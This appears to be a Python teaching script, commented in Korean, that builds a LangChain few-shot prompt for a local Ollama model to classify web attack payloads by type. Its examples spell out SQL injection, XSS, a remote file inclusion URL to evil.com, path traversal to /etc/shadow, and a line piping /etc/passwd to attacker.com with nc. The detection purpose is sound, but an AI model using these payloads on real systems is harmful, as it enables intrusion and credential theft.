from langchain_core.prompts import (
    PromptTemplate,
    FewShotPromptTemplate,
)
# ChatOpenAI는 임포트만 하고 Ollama를 사용합니다.
#from langchain_openai import ChatOpenAI 
from langchain_core.output_parsers import StrOutputParser
from langchain_ollama import ChatOllama

# --- 1. '예제(Examples)' 데이터 정의 ---
# 모델에게 학습시킬 "공격 패턴"과 "유형"의 쌍입니다.
# 'Normal' 유형을 추가하여 정상적인 입력도 구분하도록 합니다.
examples = [
    {
        "input": "' OR '1'='1' --",
        "attack_type": "SQL Injection"
    },
    {
        "input": "<script>alert('XSS')</script>",
        "attack_type": "PHP/HTML Injection (XSS)"
    },
    {
        "input": "index.php?page=http://evil.com/shell.php",
        "attack_type": "Remote File Inclusion (RFI)"
    },
    {
        "input": "8.8.8.8; ls -la /",
        "attack_type": "Command Injection"
    },
    {
        "input": "안녕하세요, 로그인하고 싶습니다.",
        "attack_type": "Normal"
    },
    {
        "input": "UNION SELECT user, password FROM users",
        "attack_type": "SQL Injection"
    },
    {
        "input": "<img src=x onerror=alert(document.cookie)>",
        "attack_type": "PHP/HTML Injection (XSS)"
    },
    {
        "input": "cat /etc/passwd | nc attacker.com 80",
        "attack_type": "Command Injection"
    }
]

# --- 2. '예제 형식(Format)' 정의 ---
# 위 'examples'의 각 항목을 어떤 "일관된 형식"으로 보여줄지 정의합니다.
example_prompt = PromptTemplate(
    input_variables=["input", "attack_type"], # examples의 key와 일치
    template="입력된 페이로드: {input}\n분류된 공격 유형: {attack_type}\n---" # 예시 하나하나의 형식
)

# --- 3. 'FewShotPromptTemplate' 조립 ---
few_shot_prompt = FewShotPromptTemplate(
    # ① "예제들을 결합"하는 부분
    examples=examples,                # 사용할 예시 데이터
    example_prompt=example_prompt,    # 예시를 포맷할 템플릿
    
    # 예시 목록이 시작되기 전, LLM에게 주는 전체 지시사항
    prefix="다음은 사용자 입력을 보고 웹 공격 유형을 분류하는 예시입니다. 'SQL Injection', 'PHP/HTML Injection (XSS)', 'Command Injection', 'Remote File Inclusion (RFI)', 'Normal' 중 하나로 정확히 분류해주세요.",
    
    # ② "새로운 입력을 추가"하는 부분 (모델이 실제로 풀어야 할 문제)
    suffix="입력된 페이로드: {user_input}\n분류된 공격 유형:", # 모델이 '분류된 공격 유형:' 뒤를 채우도록 유도
    
    input_variables=["user_input"]    # 사용자가 최종적으로 입력할 변수
)

# 4. LLM 체인 구성 및 실행
llm = ChatOllama(
    base_url="http://localhost:11434",
    model="gemma3:4b" 
                      
)
chain = few_shot_prompt | llm | StrOutputParser()

# --- (참고) 최종 프롬프트가 어떻게 생겼는지 확인하기 ---
# final_prompt = few_shot_prompt.format(user_input="<body onload=alert('hi')>")
# print(final_prompt)
# ----------------------------------------------------


# --- 체인 실행 ---
# 테스트할 입력값
# new_input = "<body onload=alert('hi')>"  # PHP/HTML Injection (XSS)
# new_input = "SELECT * FROM products" # Normal
new_input = "file=../../../../etc/shadow" # Command Injection (Path Traversal) 또는 Normal (모델에 따라 다름)
# new_input = "1' AND 1=(SELECT COUNT(*) FROM tablenames); --" # SQL Injection

result = chain.invoke({"user_input": new_input})

print(f"입력: {new_input}")
print(f"결과: {result.strip()}") # strip()으로 앞뒤 공백 제거
